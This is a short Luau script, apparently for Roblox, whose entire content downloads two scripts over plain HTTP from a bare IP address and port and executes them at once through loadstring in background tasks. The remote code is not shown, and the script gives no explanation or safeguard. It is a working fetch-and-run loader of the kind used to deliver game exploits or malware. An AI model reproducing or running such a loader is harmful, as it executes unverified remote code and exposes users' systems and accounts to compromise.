local function main()
    loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
end
local function loadui()
  loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
end
task.spawn(main)
task.spawn(loadui)
